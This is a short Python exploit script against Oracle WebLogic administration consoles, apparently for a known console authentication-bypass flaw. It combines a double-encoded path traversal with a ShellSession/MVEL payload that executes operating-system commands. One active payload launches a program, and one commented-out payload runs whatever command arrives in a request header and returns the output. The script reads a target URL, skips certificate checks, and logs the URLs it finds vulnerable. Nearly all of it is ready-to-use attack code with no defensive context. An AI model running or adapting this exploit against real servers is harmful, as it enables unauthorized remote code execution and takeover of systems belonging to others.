# -*- coding: UTF-8 -*-
import http.client
import requests
from click._compat import raw_input

http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
headers={'Connection':'close',
'cmd':'echo 666'
}
path_out = "1.txt"
# payloads = [r"""/console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')"""]
payloads = [r"""/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22)"""]
def http_request(url):
    try:
        ##print("Trying:" + url + ' ' + '[' + str(left) + '/' + str(countLines) + ']')
        print("Trying:" + url)
        for payload in payloads:
            try:
                vulurl = url + payload
                print(vulurl)
                r = requests.get(url=vulurl, headers=headers, timeout=10, verify= False)
                print(r.text)
                if r.status_code == 200 and '666' in r.text:
                    print("\033[1;40;32m[Vuln] {}\033[0m".format(vulurl))
                    print(r.text)
                    with open(path_out,'a') as f:
                        f.write(vulurl + '\n')
                        return
                else:
                    print("[-]" + "r.status_code:" + str(r.status_code) + "," + "raise.text:" + r.text)
            except Exception as err:
                print(err)
    except Exception as err:
        print(err)     
myurl=raw_input("enter url \n")
http_request(myurl)       